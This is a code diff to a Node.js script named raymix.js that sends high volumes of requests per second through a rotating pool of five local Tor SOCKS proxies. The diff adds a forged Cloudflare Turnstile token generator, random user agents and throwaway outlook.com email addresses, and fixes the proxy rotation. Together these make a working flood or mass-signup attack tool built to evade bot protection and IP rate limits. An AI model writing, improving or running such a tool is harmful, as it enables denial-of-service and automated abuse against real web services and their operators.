@@ -6,6 +6,7 @@ const { SocksProxyAgent } = require("socks-proxy-agent");
 
 if (process.argv.length < 5) {
     console.log("Usage: node raymix.js <duration_seconds> <rps> <connections> [workers]");
+    console.log("Example: node raymix.js 120 2000 4");
     process.exit(0);
 }
 
@@ -16,21 +17,34 @@ const WORKERS = parseInt(process.argv[5] || os.cpus().length);
 
 const DEBUG = true;
 
-// ====================== MULTI-TOR PROXY POOL ======================
+// ====================== MULTI-TOR PROXY POOL (5 ports) ======================
 const PROXY_PORTS = [9050, 9051, 9052, 9053, 9054];
-const agents = PROXY_PORTS.map(port => 
-    new SocksProxyAgent(`socks5://127.0.0.1:${port}`)
-);
+const agents = PROXY_PORTS.map(port => new SocksProxyAgent(`socks5://127.0.0.1:${port}`));
 
 let proxyIndex = 0;
 function getNextAgent() {
     const agent = agents[proxyIndex % agents.length];
+    const port = PROXY_PORTS[proxyIndex % agents.length];
     proxyIndex++;
-    return { agent, port: PROXY_PORTS[proxyIndex % agents.length] };
+    return { agent, port };
 }
 
 let userAgents = [];
-// ... (generateMockTurnstileToken, randomString, getRandomUserAgent stay the same)
+
+function generateMockTurnstileToken() {
+    const randStr = (len) => {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+        let result = '';
+        for (let i = 0; i < len; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    };
+    const part1 = '0.' + randStr(250);
+    const part2 = randStr(22);
+    const part3 = randStr(64);
+    return `${part1}.${part2}.${part3}`;
+}
 
 try {
     userAgents = fs.readFileSync("user-agents.txt", "utf8")
@@ -41,6 +55,14 @@ try {
 } catch (e) {
     console.error("user-agents.txt not found, using default");
     userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
+}
+
+function randomString(len = 12) {
+    return Math.random().toString(36).substring(2, len + 2);
+}
+
+function getRandomUserAgent() {
+    return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
 
 // ====================== MASTER ======================
@@ -92,7 +114,7 @@ if (cluster.isPrimary) {
 
         for (let i = 0; i < PER_TICK; i++) {
             const { agent, port } = getNextAgent();
-            const rand = Math.random().toString(36).substring(2, 12);
+            const rand = randomString(10);
             const email = `${rand}@outlook.com`;
             const turnstyletoken = generateMockTurnstileToken();
 
